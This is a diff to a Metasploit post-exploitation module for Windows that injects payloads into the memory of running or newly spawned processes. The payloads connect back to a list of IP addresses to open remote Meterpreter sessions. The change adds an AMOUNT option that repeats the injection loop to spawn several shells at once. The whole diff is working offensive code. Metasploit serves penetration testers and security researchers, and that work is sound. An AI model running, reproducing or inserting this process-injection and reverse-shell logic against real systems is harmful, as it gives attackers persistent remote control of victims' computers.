@@ -1,8 +1,6 @@
 ##
-# ## This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'msf/core'
@@ -14,14 +12,16 @@ class Metasploit3 < Msf::Post
   def initialize(info={})
     super( update_info( info,
       'Name'          => 'Windows Manage Inject in Memory Multiple Payloads',
-      'Description'   => %q{ This module will inject in to several process a given
+      'Description'   => %q{ This module will inject in to several processes a given
         payload and connecting to a given list of IP Addresses.
         The module works with a given lists of IP Addresses and
         process PIDs if no PID is given it will start a the given
         process in the advanced options and inject the selected
         payload in to the memory of the created module.},
       'License'       => MSF_LICENSE,
-      'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
+      'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>',
+                            'David Kennedy "ReL1K" <kennedyd013[at]gmail.com>' # added multiple payload support
+                         ],
       'Platform'      => [ 'win' ],
       'SessionTypes'  => [ 'meterpreter']
     ))
@@ -32,7 +32,8 @@ class Metasploit3 < Msf::Post
         OptInt.new('LPORT',      [false, 'Port number for the payload LPORT variable.', 4444]),
         OptString.new('IPLIST',  [true, 'List of semicolom separated IP list.', Rex::Socket.source_address("1.2.3.4")]),
         OptString.new('PIDLIST', [false, 'List of semicolom separated PID list.', '']),
-        OptBool.new('HANDLER',   [false, 'Start new multi/handler job on local box.', false])
+        OptBool.new('HANDLER',   [false, 'Start new multi/handler job on local box.', false]),
+        OptInt.new('AMOUNT',     [false, 'Select the amount of shells you want to spawn.', 1])
       ], self.class)
 
     register_advanced_options(
@@ -60,19 +61,23 @@ class Metasploit3 < Msf::Post
     multi_ip = datastore['IPLIST'].split(";")
     multi_pid = datastore['PIDLIST'].split(";")
 
-    multi_ip.zip(multi_pid).each do |a|
-      # Check if we have an IP for the session
-      if a[1]
-        payload = create_payload(datastore['PAYLOAD'],a[0],datastore['LPORT'])
-        inject(a[1],payload)
-        select(nil, nil, nil, 5)
-      else
-        # if no PID we create a process to host the Meterpreter session
-        payload = create_payload(datastore['PAYLOAD'],a[0],datastore['LPORT'])
-        pid_num = start_proc(datastore['PROCESSNAME'])
-        inject(pid_num,payload)
-        select(nil, nil, nil, 5)
-      end
+    datastore['AMOUNT'].times do # iterate through number of shells
+
+        multi_ip.zip(multi_pid).each do |a|
+            # Check if we have an IP for the session
+            if a[1]
+                payload = create_payload(datastore['PAYLOAD'],a[0],datastore['LPORT'])
+                inject(a[1],payload)
+                select(nil, nil, nil, 5)
+            else
+                # if no PID we create a process to host the Meterpreter session
+                payload = create_payload(datastore['PAYLOAD'],a[0],datastore['LPORT'])
+                pid_num = start_proc(datastore['PROCESSNAME'])
+                inject(pid_num,payload)
+                select(nil, nil, nil, 5)
+            end
+
+        end
     end
   end
 
